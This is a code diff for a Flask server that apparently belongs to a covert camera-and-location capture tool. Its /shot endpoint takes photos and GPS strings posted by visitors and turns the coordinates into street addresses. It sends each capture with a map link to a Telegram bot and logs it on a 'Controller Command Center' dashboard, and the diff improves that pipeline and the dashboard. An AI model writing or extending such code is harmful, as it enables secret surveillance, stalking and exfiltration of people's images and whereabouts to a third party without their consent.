@@ -13,14 +13,16 @@ LOG_FILE = "capture_log.json"
 def check_auth(auth):
     return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD
 
-def get_address(lat, lon):
-    if lat == "Location not supported" or "denied" in lat:
-        return "Unknown"
+# FIXED: Takes the single location string and splits it properly
+def get_address(location_string):
+    if not location_string or "denied" in location_string or "not supported" in location_string or location_string == "Unknown Location":
+        return "Unknown Location"
     try:
-        # Extract raw numbers from string "lat, lon"
-        parts = lat.split(",")
+        parts = location_string.split(",")
         if len(parts) == 2:
-            url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={parts[0].strip()}&lon={parts[1].strip()}"
+            lat = parts[0].strip()
+            lon = parts[1].strip()
+            url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
             headers = {'User-Agent': 'EducationalDemo/1.0'}
             res = requests.get(url, headers=headers, timeout=5)
             if res.status_code == 200:
@@ -40,7 +42,6 @@ def gallery():
     if not check_auth(auth):
         return Response('Login required', 401, {'WWW-Authenticate': 'Basic realm="Admin"'})
     
-    # Load logs
     logs = []
     if os.path.exists(LOG_FILE):
         with open(LOG_FILE, "r") as f:
@@ -49,7 +50,7 @@ def gallery():
             except:
                 pass
                 
-    logs.reverse() # Show newest first
+    logs.reverse()
     tg_link = f"https://t.me/{TELEGRAM_CHAT_ID}" if TELEGRAM_CHAT_ID else "#"
     
     html = f"""
@@ -64,46 +65,59 @@ def gallery():
         .btn {{ background: var(--accent); color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 14px; transition: 0.2s; display: inline-block; }}
         .btn:hover {{ opacity: 0.8; }}
         .btn-tg {{ background: var(--tg); color: white; font-size: 16px; padding: 15px 30px; display: block; margin: 20px auto; text-align: center; max-width: 300px; border-radius: 50px; box-shadow: 0 4px 15px rgba(34, 158, 217, 0.4); }}
-        
+        .btn-tg:hover {{ transform: scale(1.05); }}
+        .stats {{ display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }}
+        .stat-box {{ background: var(--card); padding: 20px; border-radius: 12px; flex: 1; min-width: 200px; border: 1px solid #334155; text-align: center; }}
+        .stat-box h3 {{ margin: 0 0 10px 0; font-size: 14px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }}
+        .stat-box p {{ margin: 0; font-size: 32px; font-weight: bold; color: var(--accent); }}
         .list {{ display: flex; flex-direction: column; gap: 10px; }}
         .log-item {{ background: var(--card); padding: 15px; border-radius: 8px; border-left: 4px solid var(--accent); display: flex; justify-content: space-between; align-items: center; }}
-        .log-item span {{ font-size: 14px; }}
         .log-time {{ color: #94a3b8; font-size: 12px; }}
-        .log-loc {{ font-weight: bold; color: #10b981; }}
-        .no-data {{ text-align: center; padding: 40px; color: #64748b; }}
+        .log-loc {{ font-weight: bold; color: #10b981; font-size: 15px; }}
+        .no-data {{ text-align: center; padding: 40px; color: #64748b; font-size: 18px; }}
     </style>
+    <script>
+        function refreshPage() {{ window.location.reload(); }}
+    </script>
     </head><body>
     
     <div class="header">
         <h1>📷 Controller Command Center</h1>
         <div>
-            <a href="{tg_link}" target="_blank" class="btn btn-tg" style="margin:0; padding: 10px 20px; font-size: 14px;">✈️ Open Telegram</a>
+            <button class="btn" onclick="refreshPage()">🔄 Sync Status</button>
             <a href="/" class="btn" style="background:#334155; color:white;">Open Camera</a>
         </div>
     </div>
 
-    <h3 style="color:var(--accent)">Capture History (Locations)</h3>
+    <div class="stats">
+        <div class="stat-box"><h3>Server Status</h3><p style="color:#10b981">Online</p></div>
+        <div class="stat-box"><h3>Telegram Bot</h3><p style="color:{'#10b981' if TELEGRAM_TOKEN else '#ef4444'}">{'Connected' if TELEGRAM_TOKEN else 'Error'}</p></div>
+        <div class="stat-box"><h3>Storage</h3><p style="color:#38bdf8">Telegram Cloud</p></div>
+    </div>
+
+    <a href="{tg_link}" target="_blank" class="btn btn-tg">
+        ✈️ Open Telegram to View Photos
+    </a>
+
+    <h3 style="color:var(--accent); margin-top: 30px;">Capture History & Locations</h3>
     <div class="list">
     """
     
     if not logs:
-        html += "<div class='no-data'>No captures yet.</div>"
+        html += "<div class='no-data'>No captures yet. Click 'Open Camera' to test.</div>"
         
     for item in logs:
         html += f"""
         <div class="log-item">
             <div>
-                <span class="log-time">{item.get('time', '')}</span><br>
+                <span class="log-time">📅 {item.get('time', '')}</span><br>
                 <span class="log-loc">📍 {item.get('address', 'Unknown')}</span>
             </div>
-            <a href="{item.get('map_link', '#')}" target="_blank" class="btn" style="padding: 5px 10px; font-size: 12px;">View on Map</a>
+            <a href="{item.get('map_link', '#')}" target="_blank" class="btn" style="padding: 8px 15px; font-size: 13px; background:#10b981; color:white;">View Map</a>
         </div>
         """
         
-    html += """
-    </div>
-    </body></html>
-    """
+    html += "</div></body></html>"
     return html
 
 @app.route("/shot", methods=["POST"])
@@ -114,11 +128,11 @@ def shot():
     
     if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
         try:
-            # Convert GPS to Address for Telegram & Dashboard
+            # 1. Convert GPS to Address
             address = get_address(raw_loc)
             map_link = f"https://www.google.com/maps?q={raw_loc.replace(' ', '')}" if "," in raw_loc else "#"
             
-            # Upload to Telegram
+            # 2. Send to Telegram
             img_data = base64.b64decode(b64)
             url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
             files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
@@ -126,9 +140,11 @@ def shot():
             caption_text = f"📸 Capture: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n📍 Location: {address}\n🗺️ Map: {map_link}"
             payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption_text}
             
-            requests.post(url, data=payload, files=files)
+            tg_res = requests.post(url, data=payload, files=files)
+            if tg_res.status_code != 200:
+                print("Telegram API Error:", tg_res.text)
 
-            # Save to local log for the dashboard
+            # 3. Save to local log for the Dashboard
             log_entry = {
                 "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "address": address,
@@ -146,7 +162,7 @@ def shot():
                 json.dump(logs, f)
                 
         except Exception as e:
-            print("Error:", e)
+            print("Error processing shot:", e)
             
     return "", 204
 
